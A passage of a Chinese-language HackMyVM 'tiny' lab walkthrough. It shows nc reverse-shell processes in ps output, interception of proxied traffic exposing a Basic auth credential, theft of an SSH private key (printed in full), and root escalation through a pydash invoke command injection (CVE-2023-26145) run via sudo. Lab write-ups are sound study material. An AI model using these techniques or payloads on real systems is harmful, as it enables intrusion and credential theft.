www-data    <span class="token number">2134</span>  <span class="token number">0.0</span>  <span class="token number">1.6</span> <span class="token number">257576</span> <span class="token number">47324</span> ?        S    <span class="token number">18</span>:44   <span class="token number">0</span>:00 /usr/sbin/apa
www-data    <span class="token number">2165</span>  <span class="token number">0.0</span>  <span class="token number">1.6</span> <span class="token number">257560</span> <span class="token number">47032</span> ?        S    <span class="token number">18</span>:44   <span class="token number">0</span>:00 /usr/sbin/apa
www-data    <span class="token number">2256</span>  <span class="token number">0.0</span>  <span class="token number">1.8</span> <span class="token number">259976</span> <span class="token number">51244</span> ?        S    <span class="token number">18</span>:55   <span class="token number">0</span>:00 /usr/sbin/apa
www-data    <span class="token number">2306</span>  <span class="token number">0.0</span>  <span class="token number">1.5</span> <span class="token number">255092</span> <span class="token number">42344</span> ?        S    <span class="token number">19</span>:01   <span class="token number">0</span>:00 /usr/sbin/apa
www-data    <span class="token number">2335</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">2576</span>   <span class="token number">884</span> ?        S    <span class="token number">19</span>:04   <span class="token number">0</span>:00 <span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token function">nc</span> <span class="token parameter variable">-e</span> /
www-data    <span class="token number">2336</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>   <span class="token number">3924</span>  <span class="token number">2944</span> ?        S    <span class="token number">19</span>:04   <span class="token number">0</span>:00 <span class="token function">bash</span>
www-data    <span class="token number">2355</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">2516</span>  <span class="token number">1020</span> ?        S    <span class="token number">19</span>:04   <span class="token number">0</span>:00 /usr/bin/scri
www-data    <span class="token number">2356</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">2576</span>   <span class="token number">896</span> pts/0    Ss   <span class="token number">19</span>:04   <span class="token number">0</span>:00 <span class="token function">sh</span> <span class="token parameter variable">-c</span> /usr/bi
www-data    <span class="token number">2357</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>   <span class="token number">4188</span>  <span class="token number">3460</span> pts/0    S+   <span class="token number">19</span>:04   <span class="token number">0</span>:00 /usr/bin/bash
www-data    <span class="token number">2578</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">2576</span>   <span class="token number">912</span> ?        S    <span class="token number">19</span>:11   <span class="token number">0</span>:00 <span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token function">nc</span> <span class="token parameter variable">-e</span> /
www-data    <span class="token number">2579</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>   <span class="token number">3924</span>  <span class="token number">2924</span> ?        S    <span class="token number">19</span>:11   <span class="token number">0</span>:00 <span class="token function">bash</span>
www-data    <span class="token number">2589</span>  <span class="token number">0.0</span>  <span class="token number">0.3</span>  <span class="token number">17056</span>  <span class="token number">9912</span> ?        S    <span class="token number">19</span>:12   <span class="token number">0</span>:00 python3 <span class="token parameter variable">-c</span> im
www-data    <span class="token number">2590</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>   <span class="token number">7544</span>  <span class="token number">3560</span> pts/1    Ss   <span class="token number">19</span>:12   <span class="token number">0</span>:00 /bin/bash
root        <span class="token number">2610</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:15   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/u2:1
root        <span class="token number">2659</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:21   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/u2:2
root        <span class="token number">2660</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:21   <span class="token number">0</span>:01 <span class="token punctuation">[</span>kworker/0:2-
root        <span class="token number">2770</span>  <span class="token number">0.1</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:37   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/0:0-
root        <span class="token number">2837</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:39   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/u2:0
root        <span class="token number">2858</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:42   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/0:1-
root        <span class="token number">2870</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:44   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/u2:3
www-data    <span class="token number">2895</span>  <span class="token number">100</span>  <span class="token number">0.1</span>  <span class="token number">11456</span>  <span class="token number">4196</span> pts/1    R+   <span class="token number">19</span>:46   <span class="token number">0</span>:00 <span class="token function">ps</span> aux</code></pre>
<p><strong>tinypro+     520  0.0  0.1 531124  3996 ?        Ss   17:06   0:00 &#x2F;usr&#x2F;bin&#x2F;tiny</strong><br>可以看到了开了一个tinypro服务<br>看一下配置文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@tiny:/var/www/html/wp-admin$ <span class="token function">cat</span> /etc/tinyproxy/tinyproxy.conf
<span class="token function">cat</span> /etc/tinyproxy/tinyproxy.conf
User tinyproxy
Group tinyproxy
Port <span class="token number">8888</span>
Timeout <span class="token number">600</span>
DefaultErrorFile <span class="token string">"/usr/share/tinyproxy/default.html"</span>
StatFile <span class="token string">"/usr/share/tinyproxy/stats.html"</span>
LogFile <span class="token string">"/var/log/tinyproxy/tinyproxy.log"</span>
LogLevel Info
PidFile <span class="token string">"/run/tinyproxy/tinyproxy.pid"</span>
Upstream http localhost:1111
MaxClients <span class="token number">100</span>
Allow <span class="token number">127.0</span>.0.1
Allow ::1
Allow <span class="token number">192.168</span>.0.30
ViaProxyName <span class="token string">"tinyproxy"</span></code></pre>
<p>根据配置可以看到流量会被转发到1111端口，监听一下1111端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@tiny:/var/www/html/wp-admin$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">1111</span>
<span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">1111</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">1111</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">127.0</span>.0.1<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">127.0</span>.0.1<span class="token punctuation">]</span> <span class="token number">60076</span>
GET http://127.0.0.1:8000/id_rsa HTTP/1.1
Host: <span class="token number">127.0</span>.0.1:8000
Connection: close
Via: <span class="token number">1.1</span> tinyproxy <span class="token punctuation">(</span>tinyproxy/1.11.1<span class="token punctuation">)</span>
Authorization: Basic cm9vdDpRMlg0OXQ0V2pz
User-Agent: curl/7.88.1
Accept: */*</code></pre>
<p>能从8000端口获取ssh私钥，那么可以转发一下端口获取私钥<br>把1111端口受到流量转发到8000端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@tiny:/var/www/html/wp-admin$ 
<span class="token operator">&lt;</span>-admin$ socat <span class="token parameter variable">-v</span> tcp-listen:1111 tcp:localhost:8000
<span class="token operator">></span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000450934  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">84</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">83</span>
GET http://127.0.0.1:8000/id_rsa HTTP/1.1<span class="token punctuation">\</span>r
Host: <span class="token number">127.0</span>.0.1:8000<span class="token punctuation">\</span>r
Connection: close<span class="token punctuation">\</span>r
<span class="token operator">></span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000451322  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">39</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">84</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">122</span>
Via: <span class="token number">1.1</span> tinyproxy <span class="token punctuation">(</span>tinyproxy/1.11.1<span class="token punctuation">)</span><span class="token punctuation">\</span>r
<span class="token operator">></span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000451553  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">43</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">123</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">165</span>
Authorization: Basic cm9vdDpRMlg0OXQ0V2pz<span class="token punctuation">\</span>r
<span class="token operator">></span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000451670  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">25</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">166</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">190</span>
User-Agent: curl/7.88.1<span class="token punctuation">\</span>r
<span class="token operator">></span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000451862  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">13</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">191</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">203</span>
Accept: */*<span class="token punctuation">\</span>r
<span class="token operator">></span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000452101  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">204</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">205</span>
<span class="token punctuation">\</span>r
<span class="token operator">&lt;</span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000454284  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">2851</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">2850</span>
HTTP/1.1 <span class="token number">200</span> OK<span class="token punctuation">\</span>r
Server: nginx/1.22.1<span class="token punctuation">\</span>r
Date: Sat, <span class="token number">20</span> Apr <span class="token number">2024</span> <span class="token number">18</span>:00:01 GMT<span class="token punctuation">\</span>r
Content-Type: application/octet-stream<span class="token punctuation">\</span>r
Content-Length: <span class="token number">2602</span><span class="token punctuation">\</span>r
Last-Modified: Sat, <span class="token number">30</span> Sep <span class="token number">2023</span> 06:17:50 GMT<span class="token punctuation">\</span>r
Connection: close<span class="token punctuation">\</span>r
ETag: <span class="token string">"6517bd8e-a2a"</span><span class="token punctuation">\</span>r
Accept-Ranges: bytes<span class="token punctuation">\</span>r
<span class="token punctuation">\</span>r
-----BEGIN OPENSSH PRIVATE KEY-----
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
<span class="token assign-left variable">67apP6Gxw32v0AAAAMdmljQHRpbnkuaG12AQIDBAUGBw</span><span class="token operator">==</span>
-----END OPENSSH PRIVATE KEY-----</code></pre>
<p>拿到私钥，登录ssh</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@tiny:/tmp$ <span class="token function">vi</span> tiny.txt
www-data@tiny:/tmp$ <span class="token function">cat</span> tiny.txt 
-----BEGIN OPENSSH PRIVATE KEY-----
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
<span class="token assign-left variable">67apP6Gxw32v0AAAAMdmljQHRpbnkuaG12AQIDBAUGBw</span><span class="token operator">==</span>
-----END OPENSSH PRIVATE KEY-----
www-data@tiny:/tmp$ <span class="token function">chmod</span> <span class="token number">600</span> tiny.txt
www-data@tiny:/tmp$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span>  tiny.txt vic@192.168.56.157
The authenticity of <span class="token function">host</span> <span class="token string">'192.168.56.157 (192.168.56.157)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '</span>/var/www/.ssh' <span class="token punctuation">(</span>Permission denied<span class="token punctuation">)</span>.
Failed to <span class="token function">add</span> the <span class="token function">host</span> to the list of known hosts <span class="token punctuation">(</span>/var/www/.ssh/known_hosts<span class="token punctuation">)</span>.
Linux tiny.hmv <span class="token number">6.1</span>.0-10-amd64 <span class="token comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
╭─vic@tiny ~                                                                   
╰─$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>vic<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>vic<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>vic<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span></code></pre>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><h3 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h3><pre class="language-bash" data-language="bash"><code class="language-bash">╭─vic@tiny ~                                                                   
╰─$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> vic on tiny:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin,
    use_pty

User vic may run the following commands on tiny:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3 /opt/car.py*</code></pre>
<pre class="language-python" data-language="python"><code class="language-python">╭─vic@tiny <span class="token operator">/</span>opt 
╰─$ cat car<span class="token punctuation">.</span>py  
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> random
<span class="token keyword">import</span> pydash


<span class="token keyword">class</span> <span class="token class-name">Car</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> model<span class="token punctuation">,</span> year<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>model <span class="token operator">=</span> model
        self<span class="token punctuation">.</span>year <span class="token operator">=</span> year
        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> info_type<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> info_type <span class="token operator">==</span> <span class="token string">"model"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>model
        <span class="token keyword">elif</span> info_type <span class="token operator">==</span> <span class="token string">"year"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>year
        <span class="token keyword">elif</span> info_type <span class="token operator">==</span> <span class="token string">"id"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span><span class="token builtin">id</span>


<span class="token keyword">def</span> <span class="token function">poc</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    obj <span class="token operator">=</span> Car<span class="token punctuation">(</span><span class="token string">'Sedan'</span><span class="token punctuation">,</span> <span class="token number">2011</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> pydash<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>invoke<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> path<span class="token punctuation">,</span> arg<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Missing args: %s &lt;path> &lt;arg>'</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    poc<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
<p>这个py文件里面有个<code>pydash.objects.invoke</code>函数，这个函数存在命令注入漏洞 <strong>CVE-2023-26145</strong><br><img src="https://ooo.0x0.ooo/2024/04/21/OpxG6c.png" alt="OpxG6c.png" loading="lazy"></p>
<blockquote>
<p>当满足以下先决条件时，pydash.objects.invoke（） 方法容易受到命令注入的影响：<br>1） 源对象（参数 1）不是内置对象，例如 list&#x2F;dict（否则，无法访问 <strong>init</strong>.<strong>globals</strong> 路径）<br>2） 攻击者可以控制参数 2（路径字符串）和参数 3（要传递给调用方法的参数） pydash.collections.invoke_map（） 方法也容易受到攻击，但更难被利用，因为攻击者无法直接控制要传递给调用函数的参数。</p>
</blockquote>
<p>第一个参数是函数名，第二个参数是指令<br>有个exp <a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-PYTHON-PYDASH-5916518">https://security.snyk.io/vuln/SNYK-PYTHON-PYDASH-5916518</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">╭─vic@tiny /opt 
╰─$ <span class="token function">sudo</span> /usr/bin/python3 /opt/car.py __init__.__globals__.random._os.system <span class="token function">id</span>                                                                                                                                                                 <span class="token number">130</span> ↵
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>发现成功执行，那么直接&#x2F;bin&#x2F;bash拿到root权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">╭─vic@tiny /opt 
╰─$ <span class="token function">sudo</span> /usr/bin/python3 /opt/car.py __init__.__globals__.random._os.system /bin/bash
root@tiny:/opt<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>




